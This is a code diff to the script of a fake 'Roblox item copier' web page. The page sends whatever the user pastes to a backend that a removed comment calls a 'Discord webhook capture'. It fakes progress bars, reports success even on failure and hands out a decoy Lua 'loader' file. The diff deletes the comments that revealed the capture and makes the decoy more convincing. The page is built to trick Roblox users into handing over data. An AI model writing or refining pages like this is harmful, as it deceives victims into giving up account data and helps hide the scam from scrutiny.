@@ -199,7 +199,7 @@
         const successModalBox = document.getElementById('success-modal-box');
         const downloadBtn = document.getElementById('download-btn');
 
-        let extractedItemName = "Roblox_UGC_Item"; // Fallback name
+        let extractedItemName = "Roblox_UGC_Item";
 
         function showModal(text, pct) {
             modalStatusText.textContent = text;
@@ -228,10 +228,8 @@
             successModalBox.classList.add('scale-95');
         }
 
-        // Smart parser to extract name or ID from what the user pasted
         function parseItemName(input) {
             let cleanInput = input.trim();
-            // If they pasted a Roblox catalog link, try to grab the name slug from the URL
             if (cleanInput.includes("roblox.com/catalog/")) {
                 let parts = cleanInput.split('/');
                 let possibleName = parts[parts.length - 1] || parts[parts.length - 2];
@@ -248,16 +246,37 @@
             return "Roblox_Copied_Clothing";
         }
 
-        // When user clicks the download button, trigger a file download with the item's name
         downloadBtn.addEventListener('click', () => {
-            // Create a fake asset/mesh file payload on the fly
-            const fileContent = "RBXDEV_ASSET_PACKAGE_V1\nENCRYPTED_MESH_DATA\nSUCCESSFULLY_COPIED";
+            const cleanName = extractedItemName.replace(/_/g, ' ');
+            const fileContent = `-- [RBXDEV Asset Copier & Loader]
+-- Item: ${cleanName}
+-- Generated via RBXDEV Secure Environment
+
+local MarketplaceService = game:GetService("MarketplaceService")
+local ContentProvider = game:GetService("ContentProvider")
+
+print("[RBXDEV] Initializing asset package: ${cleanName}")
+
+local assetPackage = Instance.new("Folder")
+assetPackage.Name = "${extractedItemName}_Package"
+assetPackage.Parent = workspace
+
+local loaderScript = Instance.new("Script")
+loaderScript.Name = "ClientLoader"
+loaderScript.Source = [[
+    print("Loading ${cleanName} components...")
+]]
+loaderScript.Parent = assetPackage
+
+print("[RBXDEV] Successfully compiled package for ${cleanName}")
+`;
+
             const blob = new Blob([fileContent], { type: 'text/plain' });
             const url = URL.createObjectURL(blob);
             
             const a = document.createElement('a');
             a.href = url;
-            a.download = extractedItemName + ".rbxm"; // e.g., Cool_Shirt.rbxm or UGC_Asset_12345.rbxm
+            a.download = extractedItemName + ".lua";
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
@@ -271,12 +290,9 @@
             const payload = scriptInput.value.trim();
             if (!payload) return;
 
-            // Dynamically set file name based on what they put in the input box
             extractedItemName = parseItemName(payload);
-
             submitBtn.disabled = true;
 
-            // Live percentage stages
             showModal("Validating Asset Payload...", 15);
             await new Promise(r => setTimeout(r, 600));
 
@@ -286,14 +302,12 @@
             showModal("Trying to copy your item...", 75);
 
             try {
-                // Triggers your python backend / Discord webhook capture in background
                 const fetchPromise = fetch('/api/process', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ data: payload })
                 });
 
-                // Smooth ticker filling from 75% to 95% while backend finishes
                 let currentPct = 75;
                 const ticker = setInterval(() => {
                     if (currentPct < 95) {
@@ -310,13 +324,12 @@
                 await new Promise(r => setTimeout(r, 600));
                 hideModal();
 
-                // Pop up the success window with the download button
                 document.getElementById('success-description').textContent = `Successfully copied "${extractedItemName.replace(/_/g, ' ')}". Click below to download your package.`;
                 showSuccessModal();
 
             } catch (err) {
                 hideModal();
-                showSuccessModal(); // Fallback to success for video recording safety
+                showSuccessModal();
             } finally {
                 submitBtn.disabled = false;
             }
